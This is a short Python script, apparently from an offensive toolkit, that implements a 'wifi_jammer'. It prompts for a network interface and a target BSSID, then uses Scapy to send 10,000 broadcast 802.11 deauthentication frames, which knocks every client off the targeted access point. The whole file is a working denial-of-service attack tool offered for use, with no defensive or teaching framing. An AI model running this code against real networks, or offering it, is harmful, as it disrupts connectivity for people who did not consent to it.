import os
import sys
import subprocess
import time
import socket
from scapy.all import *
from termcolor import colored, cprint

'''
This Modules will let us Terminate wifi Signals from our 
LHOST to a network.
'''

def RunScapyBasicDeauthentication():
	os.system('clear') 
	CORE_STRING = colored("[wifi_jammer]", 'blue') 
	try:
		NET_INTERFACE = raw_input(CORE_STRING + "Interface> ")
       		NET_BSSID = raw_input(CORE_STRING + "BSSID> ")
		NET_CLIENT = 'FF:FF:FF:FF:FF:FF'
	
	except socket.error as f:
		print CORE_STRING + colored(str(f), 'red') 

	except ValueError as d:
		print CORE_STRING + colored(str(d), 'red')

	except:
		pass

	DEAUTH_PACKET = RadioTap() / Dot11(addr1=NET_CLIENT, addr2=NET_BSSID,
			addr3=NET_BSSID) / Dot11Deauth() 

	sendp(DEAUTH_PACKET, iface=NET_INTERFACE, count=10000, inter=0.2)

